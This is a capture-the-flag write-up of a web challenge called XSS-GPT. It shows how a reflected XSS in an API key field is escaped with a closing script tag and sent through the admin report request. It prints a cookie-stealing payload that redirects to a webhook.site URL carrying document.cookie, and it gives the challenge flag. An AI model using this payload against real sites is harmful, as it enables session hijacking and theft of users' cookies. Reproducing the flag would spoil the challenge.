## XSS-GPT
![image](https://github.com/user-attachments/assets/8479e899-7598-44fc-b4e0-c80bac8e3c72) <br>

# Description :
I built a chatgpt website using chatgpt. Feel free to try it! Remember to report to me if you found any bug

# Solution :

![image](https://github.com/user-attachments/assets/cd35f7db-48be-43b8-853f-879741ba8250) <br>
The challenge will bring us to a link that looks like chatgpt. I'm not allow to progress further as it says I do not have the API key but we can see that we have a lead that we can try to tamper with the API key value with other things
<br>
<br>

![image](https://github.com/user-attachments/assets/cc0c29db-0c5c-4645-bf5b-f5ed15d8480d) <br>
Since the challenge says XSS GPT, I try it rit away and it worked.A little changes is that the XSS payload needs to starts with the closing of </script> else it will not work because the API key part is wrap inside the JS script
<br>
<br>

![image](https://github.com/user-attachments/assets/08b40eda-e0a7-4b3d-9e32-d0166ff15083) <br>
XSS is a success and now we will look for a place to exploit it and get the API key. When going thru the reportAdmin() function will send a POST request to the API's endpoint along with the key. 
<br>
<br>

![image](https://github.com/user-attachments/assets/ce4526ba-a301-4ddc-900a-4b3a7e797624) <br>
Fire up BurpSuite and capture the reportAdmin request and send it to Repeater, we can see that is a POST request and the key is an empty value. With these 2, we can use the webhook method. Our solution will be sending our XSS payload inside the POST request and get the latest changes happen in webhook.site hosting service
<br>
<br>

![image](https://github.com/user-attachments/assets/ca3034f4-b787-4524-9719-41c0d465c2fc) <br>
Search webhook.site, by default they will prepare a hosting site for you, copy it and paste it in BurpSuite <br>
<br>
<br>

![image](https://github.com/user-attachments/assets/66d95877-39ac-4c11-9f66-31f81b186f6d) <br>
We will be using combination of cookie stealing and redirection. To make sure that the request will be redirected to the webhook hosting site we use and steal the cookie.
<br>
<br>

![image](https://github.com/user-attachments/assets/36963aa9-c499-49ef-b70f-9a50613182ea) <br>
The payload will look like this: <br>
</script><script>location.href="https://webhook.site/96439999-db2f-41af-8027-7f1f50a00e31?c="+document.cookie</script> <br>
We encode the payload as URL format because the reportAdmin function specifies the key value must be encodeURIComponent.
<br>
<br>

![image](https://github.com/user-attachments/assets/a1e70c8a-812d-482c-8ecf-d31576d5c866) <br>
Copy the URL encode format XSS payload and replace the null value of the key and send the request. When the Response give you a 200 OK status, we can go to the webhook.site to check for latest changes happen at hosting server.
<br>
<br>

![image](https://github.com/user-attachments/assets/ef6afacc-a7d0-4610-945d-70113e584f18) <br>
The flag is at the query string section. Yatta!
<br>
<br>

**FLAG**
```
SKR{R3flec73D_1n_API_k3y_e9bc37}
```
